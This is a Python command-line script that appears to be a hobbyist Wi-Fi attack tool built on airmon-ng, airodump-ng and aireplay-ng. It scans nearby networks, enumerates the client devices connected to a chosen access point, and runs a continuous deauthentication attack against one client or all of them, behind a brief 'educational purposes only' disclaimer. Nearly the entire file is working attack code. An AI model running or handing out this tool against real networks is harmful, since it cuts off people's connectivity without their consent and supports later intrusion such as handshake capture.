#!/usr/bin/env python3
import os
import time
import subprocess
import csv
import signal
import sys
import shutil

# Colors
GREEN = '\033[32m'
DEFAULT = '\033[39m'
ORANGE = '\033[93m'
RED = '\033[31m'
CYAN = '\033[36m'
YELLOW = '\033[33m'
BOLD = '\033[1m'
BLUE = "\033[1;34m"
RESET = "\033[0m"

class WiFiTool:
    def __init__(self):
        self.interface = None
        self.original_interface = None
        self.network = None
        self.clients = []
        self.monitor_mode = False
        

    def print_banner(self):
        os.system('clear')
        print(rf"""{BLUE}                                       
 _ .-') _     ('-.   ('-.                 .-') _    ('-. .-.  (`-.      
( (  OO) )  _(  OO) ( OO ).-.            (  OO) )  ( OO )  / ( OO ).    
 \     .'_ (,------./ . --. / ,--. ,--.  /     '._ ,--. ,--.(_/.  \_)-. 
 ,`'--..._) |  .---'| \-.  \  |  | |  |  |'--...__)|  | |  | \  `.'  /  
 |  |  \  ' |  |  .-'-'  |  | |  | | .-')'--.  .--'|   .|  |  \     /\  
 |  |   ' |(|  '--.\| |_.'  | |  |_|( OO )  |  |   |       |   \   \ |  
 |  |   / : |  .--' |  .-.  | |  | | `-' /  |  |   |  .-.  |  .'    \_) 
 |  '--'  / |  `---.|  | |  |('  '-'(_.-'   |  |   |  | |  | /  .'.  \  
 `-------'  `------'`--' `--'  `-----'      `--'   `--' `--''--'   '--' 

     {GREEN}[ 📶 Wi-Fi Security Tool by Amishck ] {DEFAULT} 
     {YELLOW}[ ⚡ Status: Authorized Testing Only ]{DEFAULT}                                                       
{RESET}""")
        print(f"{RED}{BOLD}WARNING: This tool is for educational purposes only.{DEFAULT}")
        print(f"{RED}Use this tool only on networks you own or have permission to test.{DEFAULT}")
        print(f"{RED}The author is not responsible for any misuse.{DEFAULT}")
        print("-" * 60)
        time.sleep(2)

    def get_devices(self):
        try:
            devices = os.listdir('/sys/class/net/')
            wireless_devices = [d for d in devices if d.startswith('w') or 'wlan' in d or 'mon' in d]
            return wireless_devices
        except FileNotFoundError:
            return []

    def select_interface(self):
        print(f"{CYAN}Select Interface:{DEFAULT}")
        devices = self.get_devices()
        
        if not devices:
            print(f"{RED}No wireless interfaces found.{DEFAULT}")
            sys.exit(1)

        for i, dev in enumerate(devices):
            print(f'{GREEN}[{i}] - {dev}{DEFAULT}')
        
        while True:
            try:
                choice = input(f'\n{YELLOW}Select Adapter > {DEFAULT}')
                if not choice: continue
                idx = int(choice)
                if 0 <= idx < len(devices):
                    self.interface = devices[idx]
                    self.original_interface = self.interface
                    break
            except ValueError:
                pass
        print(f"{GREEN}Selected: {self.interface}{DEFAULT}")

    def get_networks(self):
        print(f"{CYAN}Scanning for networks... (Press Ctrl+C to stop if stuck){DEFAULT}")
        
        cmd = 'nmcli --terse -f BSSID,SSID,CHAN,SIGNAL dev wifi'
        try:
            output = subprocess.check_output(cmd, shell=True, text=True)
            lines = output.strip().split('\n')
            networks = []
            for line in lines:
                parts = line.replace('\\:', '..').split(':')
                if len(parts) >= 4:
                    networks.append({
                        'BSSID': parts[0].replace('..', ':'),
                        'SSID': parts[1],
                        'CHANNEL': parts[2],
                        'SIGNAL': parts[3]
                    })
            return networks
        except subprocess.CalledProcessError:
            print(f"{RED}Error scanning networks. specific_cmd='{cmd}' failed.{DEFAULT}")
            return []

    def select_network(self):
        networks = self.get_networks()
        if not networks:
            print(f"{RED}No networks found or scan failed.{DEFAULT}")
            sys.exit(1)

        l_ssid = max([len(n['SSID']) for n in networks]) if networks else 10
        print(f"\nNO.    BSSID{' ' * 14}SSID{' ' * (l_ssid - 3)}SIG    CHANNEL")
        print(f"{'-' * (l_ssid + 45)}")
        
        for i, n in enumerate(networks):
            ssid_pad = ' ' * (l_ssid - len(n['SSID']))
            sig_int = int(n['SIGNAL'])
            color = GREEN if sig_int > 50 else (ORANGE if sig_int > 30 else RED)
            print(f"{i:<6} {n['BSSID']}   {n['SSID']}{ssid_pad}   {color}{n['SIGNAL']:<6}{DEFAULT} {n['CHANNEL']}")

        while True:
            try:
                choice = input(f'\n{YELLOW}Select Network > {DEFAULT}')
                if not choice: continue
                idx = int(choice)
                if 0 <= idx < len(networks):
                    self.network = networks[idx]
                    break
            except ValueError:
                pass

    def enable_monitor_mode(self):
        print(f"{CYAN}Enabling monitor mode on {self.interface}...{DEFAULT}")
        # Using airmon-ng
        try:
            subprocess.check_call(['sudo', 'airmon-ng', 'check', 'kill']) # Kill interfering processes
            subprocess.check_call(['sudo', 'airmon-ng', 'start', self.interface])
            self.monitor_mode = True
            
            # Identify new interface name
            # Re-scan devices to find the new monitor mode interface
            new_devices = self.get_devices()
            found_new = False
            for d in new_devices:
                if d == self.interface + "mon" or d == self.interface + "mon0" or d == "mon0": # Common renames
                    self.interface = d
                    found_new = True
                    break
            
            if not found_new and self.interface not in new_devices:
                 pass

            print(f"{GREEN}Monitor mode enabled on {self.interface}{DEFAULT}")
        except subprocess.CalledProcessError:
            print(f"{RED}Failed to enable monitor mode.{DEFAULT}")
            sys.exit(1)

    def disable_monitor_mode(self):
        if self.monitor_mode and self.original_interface:
            print(f"\n{CYAN}Restoring {self.original_interface}...{DEFAULT}")
            try:
                subprocess.call(['sudo', 'airmon-ng', 'stop', self.interface])
                subprocess.call(['sudo', 'systemctl', 'restart', 'NetworkManager']) 
                self.monitor_mode = False
                print(f"{GREEN}Restored.{DEFAULT}")
            except Exception as e:
                print(f"{RED}Error restoring: {e}{DEFAULT}")

    def scan_clients(self):
        print(f"\n{CYAN}Scanning for clients on {self.network['SSID']} ({self.network['BSSID']}) Ch:{self.network['CHANNEL']}...{DEFAULT}")
        print(f"{YELLOW}Press Ctrl+C to stop scanning and select clients.{DEFAULT}")
        
        csv_file = '/tmp/airodump_scan'
        # Clean up previous
        for f in os.listdir('/tmp'):
            if f.startswith('airodump_scan'):
                os.remove(os.path.join('/tmp', f))

        cmd = [
            'sudo', 'airodump-ng',
            '--bssid', self.network['BSSID'],
            '--channel', self.network['CHANNEL'],
            '-w', csv_file,
            '--output-format', 'csv',
            '--write-interval', '1',
            self.interface
        ]

        try:
            # Clear screen once
            os.system('clear')
            print(f"{CYAN}Scanning... Press Ctrl+C to Stop.{DEFAULT}")
            print(f"Target: {self.network['SSID']} ({self.network['BSSID']})")
            
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            last_clients_len = -1
            
            while True:
                time.sleep(0.5)
                # Parse CSV dynamically
                actual_file = csv_file + '-01.csv'
                if os.path.exists(actual_file):
                    self.parse_clients(actual_file)
                    
                    if len(self.clients) != last_clients_len:
                        os.system('clear')
                        print(f"{CYAN}Scanning... Press Ctrl+C to Stop.{DEFAULT}")
                        print(f"Target: {self.network['SSID']} ({self.network['BSSID']})")
                        print(f"\n{GREEN}Clients Found: {len(self.clients)}{DEFAULT}")
                        
                        print(f"{'INDEX':<6} {'MAC ADDRESS':<20} {'PWR':<6} {'PKTS':<6}")
                        print("-" * 40)
                        for i, c in enumerate(self.clients):
                             print(f"[{i:<4}] {c['Station MAC']:<20} {c['Power']:<6} {c['Packets']:<6}")
                        
                        last_clients_len = len(self.clients)
                
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Stopping Scan...{DEFAULT}")
            pass
        finally:
            if 'proc' in locals():
                proc.terminate()
                try:
                    proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    proc.kill()
            
            actual_file = csv_file + '-01.csv'
            if os.path.exists(actual_file):
                 self.parse_clients(actual_file)

    def parse_clients(self, csv_path):
        self.clients = []
        try:
            with open(csv_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
                
            # Find where the client section starts
            client_start_index = -1
            for i, line in enumerate(lines):
                if line.strip().startswith('Station MAC'):
                    client_start_index = i
                    break
            
            if client_start_index != -1:
                # Parse clients
                for line in lines[client_start_index+1:]:
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 6:
                        client_bssid = parts[5]
                        if client_bssid == self.network['BSSID']:
                            self.clients.append({
                                'Station MAC': parts[0],
                                'Power': parts[3],
                                'Packets': parts[4]
                            })
        except Exception:
            pass

    def select_attack(self):
        if not self.clients:
            print(f"{RED}No clients found.{DEFAULT}")
            choice = input(f"{YELLOW}Deauth ALL clients? (y/n) > {DEFAULT}")
            if choice.lower() == 'y':
                self.deauth_attack(target=None) # All
            return

        print(f"\n{CYAN}Select Target:{DEFAULT}")
        print(f"{GREEN}[A] - Deauth ALL Clients{DEFAULT}")
        for i, c in enumerate(self.clients):
            print(f"{GREEN}[{i}] - {c['Station MAC']} (Pwr: {c['Power']}){DEFAULT}")
        
        while True:
            choice = input(f'\n{YELLOW}Select Target > {DEFAULT}')
            if choice.lower() == 'a':
                self.deauth_attack(target=None)
                break
            try:
                idx = int(choice)
                if 0 <= idx < len(self.clients):
                    self.deauth_attack(target=self.clients[idx]['Station MAC'])
                    break
            except ValueError:
                pass

    def deauth_attack(self, target=None):
        print(f"\n{RED}Starting Deauth Attack... Press Ctrl+C to Stop.{DEFAULT}")
        
        if target:
            # Targeted
            print(f"Targeting: {target}")
            # aireplay-ng -0 0 -a BSSID -c CLIENT INTERFACE
            cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', self.network['BSSID'], '-c', target, self.interface]
        else:
            # Broadcast
            print(f"Targeting: ALL")
            cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', self.network['BSSID'], self.interface]
        
        try:
            subprocess.call(cmd)
        except KeyboardInterrupt:
            print(f"\n{GREEN}Attack Stopped.{DEFAULT}")

    def cleanup_and_exit(self, signum, frame):
        self.disable_monitor_mode()
        sys.exit(0)

    def run(self):
        self.print_banner()
        self.select_interface()
        self.select_network()
        self.enable_monitor_mode()
        self.scan_clients()
        self.select_attack()
        self.disable_monitor_mode()

if __name__ == '__main__':
    tool = WiFiTool()
    try:
        tool.run()
    except KeyboardInterrupt:
        tool.cleanup_and_exit(None, None)
    except Exception as e:
        print(f"\n{RED}An error occurred: {e}{DEFAULT}")
        tool.disable_monitor_mode()
